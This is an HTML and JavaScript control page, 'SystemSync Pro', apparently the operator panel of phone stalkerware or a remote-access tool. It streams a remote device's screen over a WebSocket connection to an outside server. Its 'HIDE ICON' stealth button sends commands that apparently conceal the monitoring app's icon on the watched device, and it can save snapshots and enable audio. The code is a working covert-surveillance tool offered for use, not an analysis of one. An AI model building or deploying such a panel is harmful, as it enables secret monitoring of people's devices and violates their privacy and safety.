<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync Pro Control</title>
    <style>
        body { background: #0a0a0a; color: #eee; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 20px; }
        
        /* Status Bar */
        .status-container { margin-bottom: 15px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .dot { height: 10px; width: 10px; background-color: #555; border-radius: 50%; display: inline-block; transition: 0.3s; }
        .dot.online { background-color: #28a745; box-shadow: 0 0 8px #28a745; }

        /* Video Container */
        .container { margin: 10px auto; width: 320px; height: 568px; border: 4px solid #222; background: #000; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
        canvas { width: 100%; height: 100%; object-fit: contain; }

        /* Control Panel */
        .panel { background: #1a1a1a; padding: 20px; border-radius: 12px; display: inline-block; margin-top: 20px; }
        
        button { padding: 12px 20px; margin: 5px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: 0.3s; color: white; min-width: 120px; }
        
        /* Toggle States */
        .btn-start { background: #28a745; }
        .btn-start:hover { background: #218838; }
        .btn-stop { background: #dc3545; }
        .btn-stop:hover { background: #c82333; }
        
        .btn-stealth { background: #6f42c1; }
        .btn-snap { background: #444; }

        .settings { margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 15px; font-size: 14px; color: #bbb; }
        input[type="checkbox"] { cursor: pointer; }
    </style>
</head>
<body>

    <h2>SystemSync Pro</h2>
    
    <div class="status-container">
        <span id="dot" class="dot"></span>
        <span id="statusText">Disconnected</span>
    </div>

    <div class="container">
        <canvas id="canvas" width="360" height="640"></canvas>
    </div>

    <div class="panel">
        <button id="toggleBtn" class="btn-start">START VIEWING</button>
        
        <button id="stealthBtn" class="btn-stealth">HIDE ICON</button>
        <button id="snapBtn" class="btn-snap">SNAPSHOT</button>

        <div class="settings">
            <label><input type="checkbox" id="audioSync"> Enable Audio</label>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const toggleBtn = document.getElementById('toggleBtn');
        const stealthBtn = document.getElementById('stealthBtn');
        const snapBtn = document.getElementById('snapBtn');
        const audioSync = document.getElementById('audioSync');
        const statusText = document.getElementById('statusText');
        const dot = document.getElementById('dot');

        const SERVER_URL = "wss://mirror-view.onrender.com"; 

        let ws = null;
        let vDec = null;
        let isConnected = false;
        let isHidden = false;
        let waitingForKey = true;

        // --- Main Toggle Logic ---
        toggleBtn.onclick = () => {
            if (!isConnected) {
                startStreaming();
            } else {
                stopStreaming();
            }
        };

        async function startStreaming() {
            statusText.innerText = "Connecting...";
            waitingForKey = true;

            // Initialize Video Decoder
            vDec = new VideoDecoder({
                output: f => { ctx.drawImage(f, 0, 0); f.close(); },
                error: e => console.error("Decoder Error:", e)
            });
            await vDec.configure({ codec: 'avc1.42E01E', codedWidth: 360, codedHeight: 640 });

            ws = new WebSocket(SERVER_URL);
            ws.binaryType = 'arraybuffer';
            
            ws.onopen = () => {
                isConnected = true;
                statusText.innerText = "Live (Syncing...)";
                dot.classList.add('online');
                toggleBtn.innerText = "STOP VIEWING";
                toggleBtn.className = "btn-stop";
            };

            ws.onmessage = e => {
                if (typeof e.data === "string") return; // Handle commands
                
                const data = new Uint8Array(e.data);
                const type = data[0]; 
                const payload = data.slice(1);

                if (type === 0) { // Video
                    const isKey = payload.length > 4000;
                    if (waitingForKey && !isKey) return;
                    if (isKey) {
                        waitingForKey = false;
                        statusText.innerText = "Streaming Live";
                    }

                    if (vDec.state === "configured") {
                        vDec.decode(new EncodedVideoChunk({
                            type: isKey ? 'key' : 'delta',
                            timestamp: performance.now(),
                            data: payload
                        }));
                    }
                }
            };

            ws.onclose = () => stopStreaming();
            ws.onerror = () => stopStreaming();
        }

        function stopStreaming() {
            if (ws) ws.close();
            if (vDec && vDec.state !== "closed") vDec.close();
            
            isConnected = false;
            statusText.innerText = "Disconnected";
            dot.classList.remove('online');
            toggleBtn.innerText = "START VIEWING";
            toggleBtn.className = "btn-start";
            
            // Clear Canvas
            ctx.fillStyle = "#000";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        // --- Stealth Mode Logic ---
        stealthBtn.onclick = () => {
            if (!isConnected) return alert("Connect to stream first!");
            
            if (!isHidden) {
                ws.send("HIDE_ICON");
                stealthBtn.innerText = "SHOW ICON";
                isHidden = true;
            } else {
                ws.send("SHOW_ICON");
                stealthBtn.innerText = "HIDE ICON";
                isHidden = false;
            }
        };

        // --- Snapshot Logic ---
        snapBtn.onclick = () => {
            const link = document.createElement('a');
            link.download = `sync-${Date.now()}.png`;
            link.href = canvas.toDataURL();
            link.click();
        };
    </script>
</body>
</html>
